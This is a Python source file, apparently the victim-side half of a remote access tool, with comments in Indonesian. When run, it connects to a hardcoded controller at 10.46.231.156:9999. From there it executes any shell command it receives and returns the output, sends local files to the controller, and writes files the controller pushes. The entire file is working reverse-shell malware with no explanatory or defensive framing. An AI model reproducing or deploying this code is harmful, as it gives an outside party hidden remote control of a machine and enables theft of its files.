# target.py
import socket
import subprocess
from subprocess import PIPE
import json
import os

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('10.46.231.156', 9999))

def menerima_perintah():
    data = ''
    while True:
        try:
            data = data + sc.recv(1024).decode()
            # we expect a JSON-encoded string command (e.g. "ls -la" or "cd folder")
            return json.loads(data)
        except ValueError:
            continue

def upload_file(namafile):
    try:
        with open(namafile, 'rb') as f:
            chunk = f.read(1024)
            # kirim raw bytes sampai habis
            while chunk:
                sc.send(chunk)
                chunk = f.read(1024)
        # beri timeout kecil supaya penerima tahu transfer selesai (penerima akan set timeout)
    except Exception as e:
        # kirimkan pesan error (sebagai JSON string) agar sisi pengontrol tahu gagal
        err = json.dumps(f"ERROR: {str(e)}")
        sc.send(err.encode())
        
def download_file(namafile):
	file = open(namafile, 'wb')
	sc.settimeout(1)
	_file = sc.recv(1024)
	while _file:
		file.write(_file)
		try:
			_file = sc.recv(1024)
		except socket.timeout as e:
			break
	sc.settimeout(None)
	file.close()
		

def jalankan_perintah():
    while True:
        perintah = menerima_perintah()

        # pastikan perintah adalah string
        if not isinstance(perintah, str):
            sc.send(json.dumps("Perintah tidak valid").encode())
            continue

        if perintah in ('exit', 'quit'):
            break
        elif perintah == 'clear':
            # kirim konfirmasi kosong agar prompt di sisi server tetap sinkron
            sc.send(json.dumps("").encode())
            continue
        elif perintah.startswith('cd '):
            path = perintah[3:].strip()
            try:
                os.chdir(path)
                hasil = os.getcwd()
            except Exception as e:
                hasil = f"ERROR: {str(e)}"
            sc.send(json.dumps(hasil).encode())
            continue
        elif perintah.startswith('download '):
            # server minta file dari target: kirim file (raw bytes)
            namafile = perintah.split(' ', 1)[1]
            upload_file(namafile)
            # setelah kirim file, terus loop (server memakai timeout untuk tahu selesai)
            continue
        elif perintah[:6] == 'upload':
        	download_file(perintah[7:])
        
        else:
            # jalankan perintah shell biasa dan kirim stdout+stderr
            try:
                execute = subprocess.Popen(
                    perintah,
                    shell=True,
                    stdout=PIPE,
                    stderr=PIPE,
                    stdin=PIPE
                )
                data = execute.stdout.read() + execute.stderr.read()
                try:
                    data = data.decode()
                except:
                    # bila bukan teks, kirim representasi bytes
                    data = str(data)
            except Exception as e:
                data = f"ERROR: {str(e)}"

            output = json.dumps(data)
            sc.send(output.encode())

    sc.close()

if __name__ == "__main__":
    jalankan_perintah()
